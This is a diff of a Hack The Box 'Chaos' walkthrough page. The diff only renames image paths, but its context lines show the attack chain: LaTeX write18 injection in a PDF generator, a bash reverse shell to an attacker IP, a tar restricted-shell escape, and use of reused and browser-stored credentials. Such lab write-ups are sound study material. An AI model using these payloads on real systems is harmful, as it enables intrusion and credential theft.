@@ -71,11 +71,11 @@ I added `chaos.htb` to my `/etc/hosts` file since there's a DNS name returned fr
 
 Visiting the IP address alone blocks us:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Visiting `chaos.htb` shows us a typical security company page:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The website looked rather static, so I did a `gobuster` directory and `wfuzz` subdomain scan. The `gobuster` scan returned nothing of interest, while the `wfuzz` scan did return a `webmail` subdomain.
 
@@ -118,7 +118,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The Wordpress site was rather simple as well, and just contained one locked article:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 I didn't have a password yet, so I ran a `wpscan` on the URL and found one user named `human`:
 
@@ -133,21 +133,21 @@ $ wpscan --api-token my_token --enumerate p,t,u --url http://10.129.253.192/wp/w
 
 Using `human` as the password worked, and we could see the post:
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, we can add the `webmail` subdomain to the `/etc/hosts` file and enumerate that next. When visited, it just shows a typical Roundcube login page:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using the credentials we found earlier, we can login to view the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Webmail Files --> Hidden URL
 
 Within the Drafts of the user, I found one message with 2 files called `enim_msg.txt` and `en.py`:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here's the contents of the Python script:
 
@@ -229,11 +229,11 @@ Ayush
 
 The URL shows a PDF maker thing:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sending requests doesn't seem to do anything, so I took a look at it within Burpsuite:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 The above reveals that it is running an outdated version of pdfTeX. There are multiple methods of which we can use LaTeX injection to get RCE:
 
@@ -241,11 +241,11 @@ The above reveals that it is running an outdated version of pdfTeX. There are mu
 
 I used `\immediate\write18\{id}` to test, and it worked:
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using `\immediate\write18{bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'}` will get us a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -264,7 +264,7 @@ drwx------  5 sahay sahay 4096 Jul 12  2022 sahay
 
 `ayush` uses the same password of `jiujitsu`.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 `ayush` has a restricted shell.&#x20;
 
@@ -316,7 +316,7 @@ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Mozilla Creds --> Root
 
@@ -370,6 +370,6 @@ Password: 'Thiv8wrej~'
 
 Then, `su` to `root`!
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 Interestingly, these are credentials for the Webmin instance present on the machine.&#x20;
